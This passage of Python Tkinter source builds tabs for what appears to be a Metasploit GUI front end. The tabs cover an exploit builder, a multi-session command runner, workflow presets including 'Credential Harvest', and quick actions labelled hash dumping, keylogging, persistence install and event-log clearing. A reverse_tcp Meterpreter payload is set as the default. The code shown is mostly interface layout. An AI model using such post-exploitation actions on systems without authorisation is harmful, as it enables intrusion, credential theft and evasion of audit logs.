        ttk.Button(control_frame, text="Clear Map", command=self.clear_network_map).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(control_frame, text="Export Diagram", command=self.export_network_diagram).pack(side=tk.LEFT)
        
        # Network visualization (simplified - using tree view for now)
        viz_frame = ttk.LabelFrame(map_frame, text="Network Topology", padding="3")
        viz_frame.pack(fill=tk.BOTH, expand=True)
        
        self.network_tree = ttk.Treeview(viz_frame, columns=("Host", "IP", "OS", "Services", "Routes"), show="tree headings", height=10)
        self.network_tree.heading("#0", text="Network")
        self.network_tree.heading("Host", text="Host")
        self.network_tree.heading("IP", text="IP Address")
        self.network_tree.heading("OS", text="OS")
        self.network_tree.heading("Services", text="Services")
        self.network_tree.heading("Routes", text="Routes")
        
        network_scroll = ttk.Scrollbar(viz_frame, orient=tk.VERTICAL, command=self.network_tree.yview)
        self.network_tree.configure(yscrollcommand=network_scroll.set)
        self.network_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        network_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
    def create_logs_history_tab(self):
        """Create Logs & History tab."""
        logs_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(logs_frame, text="Logs & History")
        
        # Notebook for different log types
        logs_notebook = ttk.Notebook(logs_frame)
        logs_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Command history
        history_frame = ttk.Frame(logs_notebook, padding="3")
        logs_notebook.add(history_frame, text="Command History")
        
        history_control = ttk.Frame(history_frame)
        history_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(history_control, text="Clear History", command=self.clear_command_history).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(history_control, text="Export History", command=self.export_command_history).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(history_control, text="Save as Script", command=self.save_history_as_script).pack(side=tk.LEFT)
        
        self.command_history_text = scrolledtext.ScrolledText(history_frame, wrap=tk.WORD, font=("Consolas", 9), height=12)
        self.command_history_text.pack(fill=tk.BOTH, expand=True)
        
        # Activity logs
        activity_frame = ttk.Frame(logs_notebook, padding="3")
        logs_notebook.add(activity_frame, text="Activity Logs")
        
        activity_columns = ("Time", "Type", "Action", "Details")
        self.activity_logs_tree = ttk.Treeview(activity_frame, columns=activity_columns, show="headings", height=12)
        for col in activity_columns:
            self.activity_logs_tree.heading(col, text=col)
            self.activity_logs_tree.column(col, width=200)
        
        activity_scroll = ttk.Scrollbar(activity_frame, orient=tk.VERTICAL, command=self.activity_logs_tree.yview)
        self.activity_logs_tree.configure(yscrollcommand=activity_scroll.set)
        self.activity_logs_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        activity_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Statistics
        stats_frame = ttk.Frame(logs_notebook, padding="3")
        logs_notebook.add(stats_frame, text="Statistics")
        
        self.stats_text = scrolledtext.ScrolledText(stats_frame, wrap=tk.WORD, font=("Consolas", 9), height=12)
        self.stats_text.pack(fill=tk.BOTH, expand=True)
        
        # Populate existing history and logs
        self.populate_history_logs()
        self.update_statistics()
    
    def populate_history_logs(self):
        """Populate history and activity logs from existing data."""
        # Populate command history
        if hasattr(self, 'command_history_text') and hasattr(self, 'command_history'):
            for command in self.command_history:
                self.command_history_text.insert(tk.END, f"{command}\n")
            if self.command_history:
                self.command_history_text.see(tk.END)
        
        # Populate activity logs
        if hasattr(self, 'activity_logs_tree') and hasattr(self, 'activity_logs'):
            for log in self.activity_logs:
                self.activity_logs_tree.insert("", tk.END, values=(
                    log.get('time', ''),
                    log.get('type', ''),
                    log.get('action', ''),
                    log.get('details', '')
                ))
            if self.activity_logs:
                self.activity_logs_tree.see(tk.END)
    
    def create_report_generator_tab(self):
        """Create Report Generator tab."""
        report_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(report_frame, text="Report Generator")
        
        # Template selection
        template_frame = ttk.LabelFrame(report_frame, text="Report Template", padding="5")
        template_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.report_template_var = tk.StringVar(value="Executive Summary")
        templates = ["Executive Summary", "Technical Report", "Custom Template"]
        
        for template in templates:
            rb = ttk.Radiobutton(
                template_frame,
                text=template,
                variable=self.report_template_var,
                value=template
            )
            rb.pack(side=tk.LEFT, padx=10)
        
        # Report sections
        sections_frame = ttk.LabelFrame(report_frame, text="Report Sections", padding="5")
        sections_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.report_sections = {
            "Methodology": tk.BooleanVar(value=True),
            "Findings": tk.BooleanVar(value=True),
            "Vulnerabilities": tk.BooleanVar(value=True),
            "Recommendations": tk.BooleanVar(value=True),
            "Evidence": tk.BooleanVar(value=True),
        }
        
        for i, (section, var) in enumerate(self.report_sections.items()):
            cb = ttk.Checkbutton(sections_frame, text=section, variable=var)
            cb.grid(row=i // 3, column=i % 3, sticky=tk.W, padx=5, pady=2)
        
        # Data sources
        data_frame = ttk.LabelFrame(report_frame, text="Data Sources", padding="5")
        data_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.report_data_sources = {
            "Hosts": tk.BooleanVar(value=True),
            "Services": tk.BooleanVar(value=True),
            "Vulnerabilities": tk.BooleanVar(value=True),
            "Credentials": tk.BooleanVar(value=True),
            "Screenshots": tk.BooleanVar(value=True),
            "Command History": tk.BooleanVar(value=False),
        }
        
        for i, (source, var) in enumerate(self.report_data_sources.items()):
            cb = ttk.Checkbutton(data_frame, text=source, variable=var)
            cb.grid(row=i // 3, column=i % 3, sticky=tk.W, padx=5, pady=2)
        
        # Preview and export
        export_frame = ttk.Frame(report_frame)
        export_frame.pack(fill=tk.X)
        
        ttk.Button(export_frame, text="Preview Report", command=self.preview_report).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(export_frame, text="Export PDF", command=lambda: self.export_report("pdf")).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(export_frame, text="Export HTML", command=lambda: self.export_report("html")).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(export_frame, text="Export Markdown", command=lambda: self.export_report("md")).pack(side=tk.LEFT)
        
        # Preview area
        preview_frame = ttk.LabelFrame(report_frame, text="Report Preview", padding="3")
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        self.report_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD, font=("Consolas", 9), height=10)
        self.report_preview.pack(fill=tk.BOTH, expand=True)
    
    def create_exploit_builder_tab(self):
        """Create Exploit Builder tab with visual configuration."""
        builder_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(builder_frame, text="Exploit Builder")
        
        # Exploit selection
        exploit_frame = ttk.LabelFrame(builder_frame, text="Exploit Selection", padding="5")
        exploit_frame.pack(fill=tk.X, pady=(0, 5))
        
        exploit_select_frame = ttk.Frame(exploit_frame)
        exploit_select_frame.pack(fill=tk.X)
        
        ttk.Label(exploit_select_frame, text="Exploit:").pack(side=tk.LEFT, padx=(0, 5))
        self.builder_exploit_entry = ttk.Entry(exploit_select_frame, width=50)
        self.builder_exploit_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        ttk.Button(exploit_select_frame, text="Search", command=self.builder_search_exploit).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(exploit_select_frame, text="Use", command=self.builder_use_exploit).pack(side=tk.LEFT)
        
        # Configuration wizard
        config_frame = ttk.LabelFrame(builder_frame, text="Configuration Wizard", padding="5")
        config_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        # Options display
        options_frame = ttk.Frame(config_frame)
        options_frame.pack(fill=tk.BOTH, expand=True)
        
        self.builder_options_tree = ttk.Treeview(options_frame, columns=("Option", "Value", "Required", "Description"), show="headings", height=8)
        for col in ["Option", "Value", "Required", "Description"]:
            self.builder_options_tree.heading(col, text=col)
            self.builder_options_tree.column(col, width=150)
        
        builder_scroll = ttk.Scrollbar(options_frame, orient=tk.VERTICAL, command=self.builder_options_tree.yview)
        self.builder_options_tree.configure(yscrollcommand=builder_scroll.set)
        self.builder_options_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        builder_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Actions
        builder_action_frame = ttk.Frame(builder_frame)
        builder_action_frame.pack(fill=tk.X)
        
        ttk.Button(builder_action_frame, text="Show Options", command=self.builder_show_options).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(builder_action_frame, text="Check Target", command=self.builder_check_target).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(builder_action_frame, text="Run Exploit", command=self.builder_run_exploit).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(builder_action_frame, text="Background", command=self.builder_background_exploit).pack(side=tk.LEFT)
    
    def create_multi_session_runner_tab(self):
        """Create Multi-Session Command Runner tab."""
        runner_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(runner_frame, text="Multi-Session Runner")
        
        # Session selection
        selection_frame = ttk.LabelFrame(runner_frame, text="Session Selection", padding="5")
        selection_frame.pack(fill=tk.X, pady=(0, 5))
        
        sessions_control = ttk.Frame(selection_frame)
        sessions_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(sessions_control, text="Refresh Sessions", command=self.refresh_multi_sessions).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(sessions_control, text="Select All", command=self.select_all_sessions).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(sessions_control, text="Deselect All", command=self.deselect_all_sessions).pack(side=tk.LEFT)
        
        # Sessions listbox with checkboxes simulation
        sessions_frame = ttk.Frame(selection_frame)
        sessions_frame.pack(fill=tk.BOTH, expand=True)
        
        sessions_columns = ("Selected", "ID", "Type", "Target", "Info")
        self.multi_sessions_tree = ttk.Treeview(sessions_frame, columns=sessions_columns, show="headings", height=8)
        self.multi_sessions_tree.heading("Selected", text="☑")
        self.multi_sessions_tree.heading("ID", text="Session ID")
        self.multi_sessions_tree.heading("Type", text="Type")
        self.multi_sessions_tree.heading("Target", text="Target")
        self.multi_sessions_tree.heading("Info", text="Info")
        
        for col in sessions_columns:
            if col != "Selected":
                self.multi_sessions_tree.column(col, width=120)
            else:
                self.multi_sessions_tree.column(col, width=60)
        
        # Bind click to toggle selection
        self.multi_sessions_tree.bind("<Button-1>", self.toggle_session_selection)
        
        sessions_scroll = ttk.Scrollbar(sessions_frame, orient=tk.VERTICAL, command=self.multi_sessions_tree.yview)
        self.multi_sessions_tree.configure(yscrollcommand=sessions_scroll.set)
        self.multi_sessions_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sessions_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Command input
        command_frame = ttk.LabelFrame(runner_frame, text="Command to Execute", padding="5")
        command_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.multi_session_command = scrolledtext.ScrolledText(command_frame, wrap=tk.WORD, height=4)
        self.multi_session_command.pack(fill=tk.BOTH, expand=True)
        self.multi_session_command.insert("1.0", "sysinfo")
        
        # Options
        options_frame = ttk.Frame(command_frame)
        options_frame.pack(fill=tk.X, pady=(5, 0))
        
        self.multi_session_wait = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Wait for command completion", variable=self.multi_session_wait).pack(side=tk.LEFT, padx=(0, 10))
        
        self.multi_session_sequential = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="Run sequentially (one at a time)", variable=self.multi_session_sequential).pack(side=tk.LEFT)
        
        # Output display
        output_frame = ttk.LabelFrame(runner_frame, text="Command Output", padding="3")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        self.multi_session_output = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, font=("Consolas", 9), height=10)
        self.multi_session_output.pack(fill=tk.BOTH, expand=True)
        
        # Actions
        action_frame = ttk.Frame(runner_frame)
        action_frame.pack(fill=tk.X)
        
        ttk.Button(action_frame, text="Execute on Selected Sessions", command=self.execute_multi_session_command, style="Accent.TButton").pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(action_frame, text="Clear Output", command=lambda: self.multi_session_output.delete("1.0", tk.END)).pack(side=tk.LEFT)
    
    def create_workflow_automation_tab(self):
        """Create Workflow Automation tab."""
        workflow_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(workflow_frame, text="Workflow Automation")
        
        # Workflow management
        management_frame = ttk.LabelFrame(workflow_frame, text="Workflow Management", padding="5")
        management_frame.pack(fill=tk.X, pady=(0, 5))
        
        workflow_control = ttk.Frame(management_frame)
        workflow_control.pack(fill=tk.X)
        
        ttk.Label(workflow_control, text="Workflow:").pack(side=tk.LEFT, padx=(0, 5))
        self.workflow_var = tk.StringVar()
        self.workflow_combo = ttk.Combobox(workflow_control, textvariable=self.workflow_var, state="readonly", width=30)
        self.workflow_combo.pack(side=tk.LEFT, padx=(0, 5))
        self.workflow_combo.bind("<<ComboboxSelected>>", self.load_workflow)
        
        ttk.Button(workflow_control, text="New", command=self.create_new_workflow).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(workflow_control, text="Save", command=self.save_workflow).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(workflow_control, text="Delete", command=self.delete_workflow).pack(side=tk.LEFT)
        
        # Workflow editor
        editor_frame = ttk.LabelFrame(workflow_frame, text="Workflow Steps", padding="5")
        editor_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        # Workflow name
        name_frame = ttk.Frame(editor_frame)
        name_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(name_frame, text="Name:").pack(side=tk.LEFT, padx=(0, 5))
        self.workflow_name_entry = ttk.Entry(name_frame, width=40)
        self.workflow_name_entry.pack(side=tk.LEFT)
        
        # Steps list
        steps_frame = ttk.Frame(editor_frame)
        steps_frame.pack(fill=tk.BOTH, expand=True)
        
        steps_columns = ("Step", "Action", "Parameters", "Condition")
        self.workflow_steps_tree = ttk.Treeview(steps_frame, columns=steps_columns, show="headings", height=8)
        for col in steps_columns:
            self.workflow_steps_tree.heading(col, text=col)
            self.workflow_steps_tree.column(col, width=150)
        
        steps_scroll_v = ttk.Scrollbar(steps_frame, orient=tk.VERTICAL, command=self.workflow_steps_tree.yview)
        steps_scroll_h = ttk.Scrollbar(steps_frame, orient=tk.HORIZONTAL, command=self.workflow_steps_tree.xview)
        self.workflow_steps_tree.configure(yscrollcommand=steps_scroll_v.set, xscrollcommand=steps_scroll_h.set)
        
        self.workflow_steps_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        steps_scroll_v.grid(row=0, column=1, sticky=(tk.N, tk.S))
        steps_scroll_h.grid(row=1, column=0, sticky=(tk.W, tk.E))
        steps_frame.grid_rowconfigure(0, weight=1)
        steps_frame.grid_columnconfigure(0, weight=1)
        
        # Step management
        step_control_frame = ttk.Frame(editor_frame)
        step_control_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Button(step_control_frame, text="Add Step", command=self.add_workflow_step).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(step_control_frame, text="Edit Step", command=self.edit_workflow_step).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(step_control_frame, text="Remove Step", command=self.remove_workflow_step).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(step_control_frame, text="Move Up", command=self.move_workflow_step_up).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(step_control_frame, text="Move Down", command=self.move_workflow_step_down).pack(side=tk.LEFT)
        
        # Execution
        exec_frame = ttk.Frame(workflow_frame)
        exec_frame.pack(fill=tk.X)
        
        ttk.Button(exec_frame, text="▶ Run Workflow", command=self.run_workflow, style="Accent.TButton").pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(exec_frame, text="Preview Steps", command=self.preview_workflow).pack(side=tk.LEFT)
        
        # Pre-built workflows
        preset_frame = ttk.LabelFrame(workflow_frame, text="Pre-built Workflows", padding="3")
        preset_frame.pack(fill=tk.X, pady=(5, 0))
        
        preset_workflows = [
            ("Basic Recon", "Scan target and enumerate services"),
            ("Windows Post-Exploit", "Common Windows post-exploitation tasks"),
            ("Linux Post-Exploit", "Common Linux post-exploitation tasks"),
            ("Credential Harvest", "Harvest and test credentials"),
        ]
        
        preset_control = ttk.Frame(preset_frame)
        preset_control.pack(fill=tk.X)
        
        for name, desc in preset_workflows:
            btn = ttk.Button(preset_control, text=f"{name}: {desc}", command=lambda n=name: self.load_preset_workflow(n), width=30)
            btn.pack(side=tk.LEFT, padx=2)
    
    def create_session_groups_tab(self):
        """Create Session Groups tab for organizing sessions."""
        groups_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(groups_frame, text="Session Groups")
        
        # Group management
        group_mgmt_frame = ttk.LabelFrame(groups_frame, text="Group Management", padding="5")
        group_mgmt_frame.pack(fill=tk.X, pady=(0, 5))
        
        group_control = ttk.Frame(group_mgmt_frame)
        group_control.pack(fill=tk.X)
        
        ttk.Label(group_control, text="Group Name:").pack(side=tk.LEFT, padx=(0, 5))
        self.group_name_entry = ttk.Entry(group_control, width=30)
        self.group_name_entry.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(group_control, text="Create Group", command=self.create_session_group).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(group_control, text="Delete Group", command=self.delete_session_group).pack(side=tk.LEFT)
        
        # Groups and sessions display
        display_frame = ttk.Frame(groups_frame)
        display_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        # Groups list
        groups_list_frame = ttk.LabelFrame(display_frame, text="Groups", padding="3")
        groups_list_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        groups_columns = ("Name", "Sessions", "Description")
        self.session_groups_tree = ttk.Treeview(groups_list_frame, columns=groups_columns, show="tree headings", height=15)
        self.session_groups_tree.heading("#0", text="Groups")
        self.session_groups_tree.heading("Name", text="Name")
        self.session_groups_tree.heading("Sessions", text="Sessions")
        self.session_groups_tree.heading("Description", text="Description")
        
        for col in groups_columns:
            self.session_groups_tree.column(col, width=150)
        
        groups_scroll = ttk.Scrollbar(groups_list_frame, orient=tk.VERTICAL, command=self.session_groups_tree.yview)
        self.session_groups_tree.configure(yscrollcommand=groups_scroll.set)
        self.session_groups_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        groups_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Sessions in selected group
        group_sessions_frame = ttk.LabelFrame(display_frame, text="Sessions in Group", padding="3")
        group_sessions_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        sessions_columns = ("ID", "Type", "Target", "Info")
        self.group_sessions_tree = ttk.Treeview(group_sessions_frame, columns=sessions_columns, show="headings", height=15)
        for col in sessions_columns:
            self.group_sessions_tree.heading(col, text=col)
            self.group_sessions_tree.column(col, width=120)
        
        group_sessions_scroll = ttk.Scrollbar(group_sessions_frame, orient=tk.VERTICAL, command=self.group_sessions_tree.yview)
        self.group_sessions_tree.configure(yscrollcommand=group_sessions_scroll.set)
        self.group_sessions_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        group_sessions_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.session_groups_tree.bind("<<TreeviewSelect>>", self.on_group_selected)
        
        # Available sessions (for adding to groups)
        available_frame = ttk.LabelFrame(groups_frame, text="Available Sessions", padding="3")
        available_frame.pack(fill=tk.X, pady=(0, 5))
        
        available_control = ttk.Frame(available_frame)
        available_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(available_control, text="Refresh Sessions", command=self.refresh_available_sessions).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(available_control, text="Add Selected to Group", command=self.add_sessions_to_group).pack(side=tk.LEFT)
        
        available_sessions_columns = ("ID", "Type", "Target", "Info", "Current Group")
        self.available_sessions_tree = ttk.Treeview(available_frame, columns=available_sessions_columns, show="headings", height=6)
        for col in available_sessions_columns:
            self.available_sessions_tree.heading(col, text=col)
            self.available_sessions_tree.column(col, width=120)
        
        available_scroll = ttk.Scrollbar(available_frame, orient=tk.VERTICAL, command=self.available_sessions_tree.yview)
        self.available_sessions_tree.configure(yscrollcommand=available_scroll.set)
        self.available_sessions_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        available_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
    def create_quick_actions_hub_tab(self):
        """Create Quick Actions Hub tab."""
        actions_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(actions_frame, text="Quick Actions")
        
        # Quick action categories
        categories_notebook = ttk.Notebook(actions_frame)
        categories_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Reconnaissance actions
        recon_frame = ttk.Frame(categories_notebook, padding="5")
        categories_notebook.add(recon_frame, text="Reconnaissance")
        
        recon_actions = [
            ("Quick Port Scan", lambda: self.quick_action_scan_ports()),
            ("Service Enumeration", lambda: self.quick_action_service_enum()),
            ("OS Detection", lambda: self.quick_action_os_detect()),
            ("Vulnerability Scan", lambda: self.quick_action_vuln_scan()),
            ("DNS Enumeration", lambda: self.quick_action_dns_enum()),
            ("SMB Enumeration", lambda: self.quick_action_smb_enum()),
        ]
        
        for i, (name, command) in enumerate(recon_actions):
            btn = ttk.Button(recon_frame, text=name, command=command, width=25)
            btn.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky=(tk.W, tk.E))
        
        for col in range(2):
            recon_frame.columnconfigure(col, weight=1)
        
        # Post-Exploitation actions
        post_frame = ttk.Frame(categories_notebook, padding="5")
        categories_notebook.add(post_frame, text="Post-Exploitation")
        
        post_actions = [
            ("Get System", lambda: self.quick_action_getsystem()),
            ("Dump Hashes", lambda: self.quick_action_hashdump()),
            ("Screenshot", lambda: self.quick_action_screenshot()),
            ("Keylogger Start", lambda: self.quick_action_keylog_start()),
            ("Download File", lambda: self.quick_action_download()),
            ("Upload File", lambda: self.quick_action_upload()),
            ("Persistence Install", lambda: self.quick_action_persistence()),
            ("Clear Event Logs", lambda: self.quick_action_clearev()),
        ]
        
        for i, (name, command) in enumerate(post_actions):
            btn = ttk.Button(post_frame, text=name, command=command, width=25)
            btn.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky=(tk.W, tk.E))
        
        for col in range(2):
            post_frame.columnconfigure(col, weight=1)
        
        # Privilege Escalation actions
        priv_frame = ttk.Frame(categories_notebook, padding="5")
        categories_notebook.add(priv_frame, text="Privilege Escalation")
        
        priv_actions = [
            ("Windows Escalate", lambda: self.quick_action_win_escalate()),
            ("Linux Escalate", lambda: self.quick_action_linux_escalate()),
            ("Check Exploits", lambda: self.quick_action_check_exploits()),
            ("Suggest Exploits", lambda: self.quick_action_suggest_exploits()),
        ]
        
        for i, (name, command) in enumerate(priv_actions):
            btn = ttk.Button(priv_frame, text=name, command=command, width=25)
            btn.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky=(tk.W, tk.E))
        
        for col in range(2):
            priv_frame.columnconfigure(col, weight=1)
        
        # Payload actions
        payload_frame = ttk.Frame(categories_notebook, padding="5")
        categories_notebook.add(payload_frame, text="Payloads")
        
        payload_actions = [
            ("Generate Windows Payload", lambda: self.quick_action_gen_payload("windows")),
            ("Generate Linux Payload", lambda: self.quick_action_gen_payload("linux")),
            ("Generate Web Payload", lambda: self.quick_action_gen_payload("web")),
            ("Generate MSFVenom Command", lambda: self.quick_action_gen_msfvenom()),
        ]
        
        for i, (name, command) in enumerate(payload_actions):
            btn = ttk.Button(payload_frame, text=name, command=command, width=25)
            btn.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky=(tk.W, tk.E))
        
        for col in range(2):
            payload_frame.columnconfigure(col, weight=1)
        
        # Database actions
        db_frame = ttk.Frame(categories_notebook, padding="5")
        categories_notebook.add(db_frame, text="Database")
        
        db_actions = [
            ("Import Nmap Scan", lambda: self.quick_action_import_nmap()),
            ("Export Data", lambda: self.quick_action_export_data()),
            ("Clear Database", lambda: self.quick_action_clear_db()),
            ("Database Status", lambda: self.quick_action_db_status()),
        ]
        
        for i, (name, command) in enumerate(db_actions):
            btn = ttk.Button(db_frame, text=name, command=command, width=25)
            btn.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky=(tk.W, tk.E))
        
        for col in range(2):
            db_frame.columnconfigure(col, weight=1)
    
    def create_settings_tab(self):
        """Create Settings/Preferences tab."""
        settings_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(settings_frame, text="Settings")
        
        # GUI Settings
        gui_frame = ttk.LabelFrame(settings_frame, text="GUI Settings", padding="5")
        gui_frame.pack(fill=tk.X, pady=(0, 5))
        
        font_frame = ttk.Frame(gui_frame)
        font_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(font_frame, text="Font Size:", width=20).pack(side=tk.LEFT)
        self.settings_font_size = tk.StringVar(value=str(self.settings.get('font_size', 10)))
        font_spin = ttk.Spinbox(font_frame, from_=8, to=16, textvariable=self.settings_font_size, width=10)
        font_spin.pack(side=tk.LEFT)
        
        theme_frame = ttk.Frame(gui_frame)
        theme_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(theme_frame, text="Theme:", width=20).pack(side=tk.LEFT)
        self.settings_theme = tk.StringVar(value=self.settings.get('theme', 'default'))
        theme_combo = ttk.Combobox(theme_frame, textvariable=self.settings_theme, values=["default", "dark", "light"], state="readonly", width=15)
        theme_combo.pack(side=tk.LEFT)
        
        # Monitor selection
        monitor_frame = ttk.Frame(gui_frame)
        monitor_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(monitor_frame, text="Preferred Monitor:", width=20).pack(side=tk.LEFT)
        
        # Get available monitors
        monitors = self.get_monitors()
        monitor_options = ['primary']
        monitor_display_names = ['Primary Monitor']
        
        for i, monitor in enumerate(monitors):
            monitor_name = monitor['name']
            is_primary = monitor.get('primary', False)
            resolution = f"{monitor['width']}x{monitor['height']}"
            display_name = f"{monitor_name} ({resolution})"
            if is_primary:
                display_name += " [Primary]"
            
            monitor_options.append(monitor_name)
            monitor_display_names.append(display_name)
        
        self.settings_preferred_monitor = tk.StringVar(value=self.settings.get('preferred_monitor', 'primary'))
        
        # Create combobox with display names but store monitor names
        monitor_combo = ttk.Combobox(monitor_frame, textvariable=self.settings_preferred_monitor, 
                                     values=monitor_options, state="readonly", width=30)
        monitor_combo.pack(side=tk.LEFT)
        
        # Add refresh button to update monitor list
        def refresh_monitors():
            monitors = self.get_monitors()
            monitor_options = ['primary']
            for i, monitor in enumerate(monitors):
                monitor_options.append(monitor['name'])
            monitor_combo['values'] = monitor_options
            messagebox.showinfo("Info", f"Found {len(monitors)} monitor(s)")
        
        ttk.Button(monitor_frame, text="Refresh", command=refresh_monitors, width=10).pack(side=tk.LEFT, padx=(5, 0))
        
        # Metasploit Settings
        msf_frame = ttk.LabelFrame(settings_frame, text="Metasploit Settings", padding="5")
        msf_frame.pack(fill=tk.X, pady=(0, 5))
        
        payload_frame = ttk.Frame(msf_frame)
        payload_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(payload_frame, text="Default Payload:", width=20).pack(side=tk.LEFT)
        self.settings_default_payload = tk.StringVar(value=self.settings.get('default_payload', 'windows/meterpreter/reverse_tcp'))
        payload_entry = ttk.Entry(payload_frame, textvariable=self.settings_default_payload, width=40)
        payload_entry.pack(side=tk.LEFT)
        
        lhost_frame = ttk.Frame(msf_frame)
        lhost_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lhost_frame, text="Default LHOST:", width=20).pack(side=tk.LEFT)
        self.settings_default_lhost = tk.StringVar(value=self.settings.get('default_lhost', '0.0.0.0'))
        lhost_entry = ttk.Entry(lhost_frame, textvariable=self.settings_default_lhost, width=20)
        lhost_entry.pack(side=tk.LEFT)
        
        lport_frame = ttk.Frame(msf_frame)
        lport_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lport_frame, text="Default LPORT:", width=20).pack(side=tk.LEFT)
        self.settings_default_lport = tk.StringVar(value=self.settings.get('default_lport', '4444'))
        lport_entry = ttk.Entry(lport_frame, textvariable=self.settings_default_lport, width=20)
        lport_entry.pack(side=tk.LEFT)
        
        # Database settings
        db_auto_frame = ttk.Frame(msf_frame)
        db_auto_frame.pack(fill=tk.X, pady=2)
        
        self.settings_auto_init_db = tk.BooleanVar(value=self.settings.get('auto_init_db', True))
        ttk.Checkbutton(
            db_auto_frame,
            text="Auto-initialize database when not connected",
            variable=self.settings_auto_init_db
        ).pack(side=tk.LEFT)
        
        # Save button
        save_frame = ttk.Frame(settings_frame)
        save_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Button(save_frame, text="Save Settings", command=self.save_settings_from_ui).pack(side=tk.LEFT)
    
    # ==================== SUPPORTING METHODS FOR NEW TABS ====================
    
    def run_quick_start_wizard(self):
        """Run the quick start wizard based on selected scenario."""
        scenario = self.wizard_scenario_var.get()
        if not scenario:
            messagebox.showinfo("Info", "Please select a scenario first.")
            return
        
        # Switch to appropriate tab based on scenario
        tab_map = {
            "Generate a Payload": "Payload Generator",
            "Set Up a Listener": "Handler Setup",
            "Search for Exploits": "Exploit Search",
            "Scan for Vulnerabilities": "Vulnerability Scanner",
            "Manage Sessions": "Session Manager",
            "Post-Exploitation": "Post-Exploitation",
        }
        
        target_tab = tab_map.get(scenario)
        if target_tab:
            # Find and select the tab
            for i in range(self.notebook.index("end")):
                if self.notebook.tab(i, "text") == target_tab:
                    self.notebook.select(i)
                    break
    
    def switch_workspace(self):
        """Switch to a different workspace."""
        workspace = self.workspace_var.get()
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command(f"workspace -a {workspace}")
        self.current_workspace = workspace
        self.refresh_hosts()
    
    def create_workspace(self):
        """Create a new workspace."""
        workspace = self.workspace_var.get()
        if not workspace:
